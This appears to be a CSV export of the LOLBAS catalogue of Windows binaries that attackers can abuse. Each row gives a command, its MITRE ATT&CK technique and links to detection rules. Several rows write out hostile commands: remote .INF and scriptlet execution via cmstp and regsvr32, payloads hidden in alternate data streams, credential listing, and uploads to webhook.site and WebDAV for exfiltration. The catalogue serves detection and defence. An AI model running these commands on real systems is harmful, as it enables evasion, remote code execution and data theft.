Filename,Description,Author,Date,Command,Command Description,Command Usecase,Command Category,Command Privileges,MITRE ATT&CK technique,Operating System,Paths,Detections,Resources,Acknowledgements,URL
"Certutil.exe","Windows binary used for handling certificates","Oddvar Moe","2018-05-25","certutil -decode encodedInputFileName decodedOutputFileName","Command to decode a Base64 encoded file.","Decode files to evade defensive measures","Decode","User","T1140","Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11","C:\Windows\System32\certutil.exe, C:\Windows\SysWOW64\certutil.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/0fcbce993288f993e626494a50dad15fc26c8a0c/rules/windows/process_creation/win_susp_certutil_command.yml, Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_susp_certutil_encode.yml, Sigma: https://github.com/SigmaHQ/sigma/blob/e9260679d4aeae7f696001c5b14d318d31c8f076/rules/windows/process_creation/process_creation_root_certificate_installed.yml, Elastic: https://github.com/elastic/detection-rules/blob/4a11ef9514938e7a7e32cf5f379e975cebf5aed3/rules/windows/defense_evasion_suspicious_certutil_commands.toml, Elastic: https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/command_and_control_certutil_network_connection.toml, Splunk: https://github.com/splunk/security_content/blob/3f77e24974239fcb7a339080a1a483e6bad84a82/detections/endpoint/certutil_download_with_urlcache_and_split_arguments.yml, Splunk: https://github.com/splunk/security_content/blob/3f77e24974239fcb7a339080a1a483e6bad84a82/detections/endpoint/certutil_download_with_verifyctl_and_split_arguments.yml, Splunk: https://github.com/splunk/security_content/blob/3f77e24974239fcb7a339080a1a483e6bad84a82/detections/endpoint/certutil_with_decode_argument.yml, IOC: Certutil.exe creating new files on disk, IOC: Useragent Microsoft-CryptoAPI/10.0, IOC: Useragent CertUtil URL Agent","https://twitter.com/Moriarty_Meng/status/984380793383370752, https://twitter.com/mattifestation/status/620107926288515072, https://twitter.com/egre55/status/1087685529016193025","Matt Graeber (@mattifestation), Moriarty (@Moriarty_Meng), egre55 (@egre55), Lior Adar","http://localhost:4001/lolbas/Binaries/Certutil/"
"Certutil.exe","Windows binary used for handling certificates","Oddvar Moe","2018-05-25","certutil -decodehex encoded_hexadecimal_InputFileName decodedOutputFileName","Command to decode a hexadecimal-encoded file decodedOutputFileName","Decode files to evade defensive measures","Decode","User","T1140","Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11","C:\Windows\System32\certutil.exe, C:\Windows\SysWOW64\certutil.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/0fcbce993288f993e626494a50dad15fc26c8a0c/rules/windows/process_creation/win_susp_certutil_command.yml, Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_susp_certutil_encode.yml, Sigma: https://github.com/SigmaHQ/sigma/blob/e9260679d4aeae7f696001c5b14d318d31c8f076/rules/windows/process_creation/process_creation_root_certificate_installed.yml, Elastic: https://github.com/elastic/detection-rules/blob/4a11ef9514938e7a7e32cf5f379e975cebf5aed3/rules/windows/defense_evasion_suspicious_certutil_commands.toml, Elastic: https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/command_and_control_certutil_network_connection.toml, Splunk: https://github.com/splunk/security_content/blob/3f77e24974239fcb7a339080a1a483e6bad84a82/detections/endpoint/certutil_download_with_urlcache_and_split_arguments.yml, Splunk: https://github.com/splunk/security_content/blob/3f77e24974239fcb7a339080a1a483e6bad84a82/detections/endpoint/certutil_download_with_verifyctl_and_split_arguments.yml, Splunk: https://github.com/splunk/security_content/blob/3f77e24974239fcb7a339080a1a483e6bad84a82/detections/endpoint/certutil_with_decode_argument.yml, IOC: Certutil.exe creating new files on disk, IOC: Useragent Microsoft-CryptoAPI/10.0, IOC: Useragent CertUtil URL Agent","https://twitter.com/Moriarty_Meng/status/984380793383370752, https://twitter.com/mattifestation/status/620107926288515072, https://twitter.com/egre55/status/1087685529016193025","Matt Graeber (@mattifestation), Moriarty (@Moriarty_Meng), egre55 (@egre55), Lior Adar","http://localhost:4001/lolbas/Binaries/Certutil/"
"Cmd.exe","The command-line interpreter in Windows","Ye Yint Min Thu Htut","2019-06-26","cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct ^scrobj.dll > fakefile.doc:payload.bat","Add content to an Alternate Data Stream (ADS).","Can be used to evade defensive countermeasures or to hide as a persistence mechanism","ADS","User","T1564.004","Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11","C:\Windows\System32\cmd.exe, C:\Windows\SysWOW64\cmd.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/688df3405afd778d63a2ea36a084344a2052848c/rules/windows/process_creation/process_creation_alternate_data_streams.yml, Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_ads_file_creation.toml, Elastic: https://github.com/elastic/detection-rules/blob/61afb1c1c0c3f50637b1bb194f3e6fb09f476e50/rules/windows/defense_evasion_unusual_dir_ads.toml, IOC: cmd.exe executing files from alternate data streams., IOC: cmd.exe creating/modifying file contents in an alternate data stream.","https://twitter.com/yeyint_mth/status/1143824979139579904, https://twitter.com/Mr_0rng/status/1601408154780446721, https://medium.com/@mr-0range/a-new-lolbin-using-the-windows-type-command-to-upload-download-files-81d7b6179e22, https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/type","r0lan (@yeyint_mth), Mr.0range (@mr_0rng)","http://localhost:4001/lolbas/Binaries/Cmd/"
"Cmd.exe","The command-line interpreter in Windows","Ye Yint Min Thu Htut","2019-06-26","cmd.exe - < fakefile.doc:payload.bat","Execute payload.bat stored in an Alternate Data Stream (ADS).","Can be used to evade defensive countermeasures or to hide as a persistence mechanism","ADS","User","T1059.003","Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11","C:\Windows\System32\cmd.exe, C:\Windows\SysWOW64\cmd.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/688df3405afd778d63a2ea36a084344a2052848c/rules/windows/process_creation/process_creation_alternate_data_streams.yml, Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_ads_file_creation.toml, Elastic: https://github.com/elastic/detection-rules/blob/61afb1c1c0c3f50637b1bb194f3e6fb09f476e50/rules/windows/defense_evasion_unusual_dir_ads.toml, IOC: cmd.exe executing files from alternate data streams., IOC: cmd.exe creating/modifying file contents in an alternate data stream.","https://twitter.com/yeyint_mth/status/1143824979139579904, https://twitter.com/Mr_0rng/status/1601408154780446721, https://medium.com/@mr-0range/a-new-lolbin-using-the-windows-type-command-to-upload-download-files-81d7b6179e22, https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/type","r0lan (@yeyint_mth), Mr.0range (@mr_0rng)","http://localhost:4001/lolbas/Binaries/Cmd/"
"Cmd.exe","The command-line interpreter in Windows","Ye Yint Min Thu Htut","2019-06-26","type \\webdav-server\folder\file.ext > C:\Path\file.ext","Downloads a specified file from a WebDAV server to the target file.","Download/copy a file from a WebDAV server","Download","User","T1105","Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11","C:\Windows\System32\cmd.exe, C:\Windows\SysWOW64\cmd.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/688df3405afd778d63a2ea36a084344a2052848c/rules/windows/process_creation/process_creation_alternate_data_streams.yml, Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_ads_file_creation.toml, Elastic: https://github.com/elastic/detection-rules/blob/61afb1c1c0c3f50637b1bb194f3e6fb09f476e50/rules/windows/defense_evasion_unusual_dir_ads.toml, IOC: cmd.exe executing files from alternate data streams., IOC: cmd.exe creating/modifying file contents in an alternate data stream.","https://twitter.com/yeyint_mth/status/1143824979139579904, https://twitter.com/Mr_0rng/status/1601408154780446721, https://medium.com/@mr-0range/a-new-lolbin-using-the-windows-type-command-to-upload-download-files-81d7b6179e22, https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/type","r0lan (@yeyint_mth), Mr.0range (@mr_0rng)","http://localhost:4001/lolbas/Binaries/Cmd/"
"Cmd.exe","The command-line interpreter in Windows","Ye Yint Min Thu Htut","2019-06-26","type C:\Path\file.ext > \\webdav-server\folder\file.ext","Uploads a specified file to a WebDAV server.","Upload a file to a WebDAV server","Upload","User","T1048.003","Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11","C:\Windows\System32\cmd.exe, C:\Windows\SysWOW64\cmd.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/688df3405afd778d63a2ea36a084344a2052848c/rules/windows/process_creation/process_creation_alternate_data_streams.yml, Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_ads_file_creation.toml, Elastic: https://github.com/elastic/detection-rules/blob/61afb1c1c0c3f50637b1bb194f3e6fb09f476e50/rules/windows/defense_evasion_unusual_dir_ads.toml, IOC: cmd.exe executing files from alternate data streams., IOC: cmd.exe creating/modifying file contents in an alternate data stream.","https://twitter.com/yeyint_mth/status/1143824979139579904, https://twitter.com/Mr_0rng/status/1601408154780446721, https://medium.com/@mr-0range/a-new-lolbin-using-the-windows-type-command-to-upload-download-files-81d7b6179e22, https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/type","r0lan (@yeyint_mth), Mr.0range (@mr_0rng)","http://localhost:4001/lolbas/Binaries/Cmd/"
"Cmdkey.exe","creates, lists, and deletes stored user names and passwords or credentials.","Oddvar Moe","2018-05-25","cmdkey /list","List cached credentials","Get credential information from host","Credentials","User","T1078","Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11","C:\Windows\System32\cmdkey.exe, C:\Windows\SysWOW64\cmdkey.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/c3c152d457773454f67895008a1abde823be0755/rules/windows/process_creation/win_cmdkey_recon.yml","https://www.peew.pw/blog/2017/11/26/exploring-cmdkey-an-edge-case-for-privilege-escalation, https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey","","http://localhost:4001/lolbas/Binaries/Cmdkey/"
"cmdl32.exe","Microsoft Connection Manager Auto-Download","Elliot Killick","2021-08-26","cmdl32 /vpn /lan %cd%\config","Download a file from the web address specified in the configuration file. The downloaded file will be in %TMP% under the name VPNXXXX.tmp where ""X"" denotes a random number or letter.","Download file from Internet","Download","User","T1105","Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11","C:\Windows\System32\cmdl32.exe, C:\Windows\SysWOW64\cmdl32.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/3416db73016f25ce115f5597fe74320d2428db66/rules/windows/process_creation/win_pc_susp_cmdl32_lolbas.yml, IOC: Reports of downloading from suspicious URLs in %TMP%\config.log, IOC: Useragent Microsoft(R) Connection Manager Vpn File Update","https://github.com/LOLBAS-Project/LOLBAS/pull/151","Elliot Killick (@elliotkillick)","http://localhost:4001/lolbas/Binaries/Cmdl32/"
"Cmstp.exe","Installs or removes a Connection Manager service profile.","Oddvar Moe","2018-05-25","cmstp.exe /ni /s c:\cmstp\CorpVPN.inf","Silently installs a specially formatted local .INF without creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll.","Execute code hidden within an inf file. Download and run scriptlets from internet.","Execute","User","T1218.003","Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11","C:\Windows\System32\cmstp.exe, C:\Windows\SysWOW64\cmstp.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/6d0d58dfe240f7ef46e7da928c0b65223a46c3b2/rules/windows/process_creation/sysmon_cmstp_execution_by_creation.yml, Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_uac_cmstp.yml, Splunk: https://github.com/splunk/security_content/blob/bee2a4cefa533f286c546cbe6798a0b5dec3e5ef/detections/endpoint/cmlua_or_cmstplua_uac_bypass.yml, Elastic: https://github.com/elastic/detection-rules/blob/82ec6ac1eeb62a1383792719a1943b551264ed16/rules/windows/defense_evasion_suspicious_managedcode_host_process.toml, Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_process_network_connection.toml, IOC: Execution of cmstp.exe without a VPN use case is suspicious, IOC: DotNet CLR libraries loaded into cmstp.exe, IOC: DotNet CLR Usage Log - cmstp.exe.log","https://twitter.com/NickTyrer/status/958450014111633408, https://gist.github.com/NickTyrer/bbd10d20a5bb78f64a9d13f399ea0f80, https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e, https://oddvar.moe/2017/08/15/research-on-cmstp-exe/, https://gist.githubusercontent.com/tylerapplebaum/ae8cb38ed8314518d95b2e32a6f0d3f1/raw/3127ba7453a6f6d294cd422386cae1a5a2791d71/UACBypassCMSTP.ps1, https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmstp","Oddvar Moe (@oddvarmoe), Nick Tyrer (@NickTyrer)","http://localhost:4001/lolbas/Binaries/Cmstp/"
"Cmstp.exe","Installs or removes a Connection Manager service profile.","Oddvar Moe","2018-05-25","cmstp.exe /ni /s https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Cmstp.inf","Silently installs a specially formatted remote .INF without creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll.","Execute code hidden within an inf file. Execute code directly from Internet.","AWL Bypass","User","T1218.003","Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10","C:\Windows\System32\cmstp.exe, C:\Windows\SysWOW64\cmstp.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/6d0d58dfe240f7ef46e7da928c0b65223a46c3b2/rules/windows/process_creation/sysmon_cmstp_execution_by_creation.yml, Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_uac_cmstp.yml, Splunk: https://github.com/splunk/security_content/blob/bee2a4cefa533f286c546cbe6798a0b5dec3e5ef/detections/endpoint/cmlua_or_cmstplua_uac_bypass.yml, Elastic: https://github.com/elastic/detection-rules/blob/82ec6ac1eeb62a1383792719a1943b551264ed16/rules/windows/defense_evasion_suspicious_managedcode_host_process.toml, Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_process_network_connection.toml, IOC: Execution of cmstp.exe without a VPN use case is suspicious, IOC: DotNet CLR libraries loaded into cmstp.exe, IOC: DotNet CLR Usage Log - cmstp.exe.log","https://twitter.com/NickTyrer/status/958450014111633408, https://gist.github.com/NickTyrer/bbd10d20a5bb78f64a9d13f399ea0f80, https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e, https://oddvar.moe/2017/08/15/research-on-cmstp-exe/, https://gist.githubusercontent.com/tylerapplebaum/ae8cb38ed8314518d95b2e32a6f0d3f1/raw/3127ba7453a6f6d294cd422386cae1a5a2791d71/UACBypassCMSTP.ps1, https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmstp","Oddvar Moe (@oddvarmoe), Nick Tyrer (@NickTyrer)","http://localhost:4001/lolbas/Binaries/Cmstp/"
"ConfigSecurityPolicy.exe","Binary part of Windows Defender. Used to manage settings in Windows Defender. you can configure different pilot collections for each of the co-management workloads. Being able to use different pilot collections allows you to take a more granular approach when shifting workloads.","Ialle Teixeira","2020-09-04","ConfigSecurityPolicy.exe C:\Windows\System32\calc.exe https://webhook.site/xxxxxxxxx?encodedfile","Upload file, credentials or data exfiltration in general","Upload file","Upload","User","T1567","Windows 10","C:\Program Files\Windows Defender\ConfigSecurityPolicy.exe, C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\ConfigSecurityPolicy.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/5e57e476c29980800dcc88a7a001ddb75d21a58b/rules/windows/process_creation/win_pc_lolbas_configsecuritypolicy.yml, IOC: ConfigSecurityPolicy storing data into alternate data streams., IOC: Preventing/Detecting ConfigSecurityPolicy with non-RFC1918 addresses by Network IPS/IDS., IOC: Monitor process creation for non-SYSTEM and non-LOCAL SERVICE accounts launching ConfigSecurityPolicy.exe., IOC: User Agent is ""MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)""","https://docs.microsoft.com/en-US/mem/configmgr/comanage/how-to-switch-workloads, https://docs.microsoft.com/en-US/mem/configmgr/comanage/workloads, https://docs.microsoft.com/en-US/mem/configmgr/comanage/how-to-monitor, https://twitter.com/NtSetDefault/status/1302589153570365440?s=20","Ialle Teixeira (@NtSetDefault), Nir Chako (Pentera) (@C_h4ck_0)","http://localhost:4001/lolbas/Binaries/ConfigSecurityPolicy/"
"ConfigSecurityPolicy.exe","Binary part of Windows Defender. Used to manage settings in Windows Defender. you can configure different pilot collections for each of the co-management workloads. Being able to use different pilot collections allows you to take a more granular approach when shifting workloads.","Ialle Teixeira","2020-09-04","ConfigSecurityPolicy.exe https://example.com/payload","It will download a remote payload and place it in the cache folder (for example - %LOCALAPPDATA%\Microsoft\Windows\INetCache\IE)","Downloads payload from remote server","Download","User","T1105","Windows 10, Windows 11","C:\Program Files\Windows Defender\ConfigSecurityPolicy.exe, C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\ConfigSecurityPolicy.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/5e57e476c29980800dcc88a7a001ddb75d21a58b/rules/windows/process_creation/win_pc_lolbas_configsecuritypolicy.yml, IOC: ConfigSecurityPolicy storing data into alternate data streams., IOC: Preventing/Detecting ConfigSecurityPolicy with non-RFC1918 addresses by Network IPS/IDS., IOC: Monitor process creation for non-SYSTEM and non-LOCAL SERVICE accounts launching ConfigSecurityPolicy.exe., IOC: User Agent is ""MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)""","https://docs.microsoft.com/en-US/mem/configmgr/comanage/how-to-switch-workloads, https://docs.microsoft.com/en-US/mem/configmgr/comanage/workloads, https://docs.microsoft.com/en-US/mem/configmgr/comanage/how-to-monitor, https://twitter.com/NtSetDefault/status/1302589153570365440?s=20","Ialle Teixeira (@NtSetDefault), Nir Chako (Pentera) (@C_h4ck_0)","http://localhost:4001/lolbas/Binaries/ConfigSecurityPolicy/"
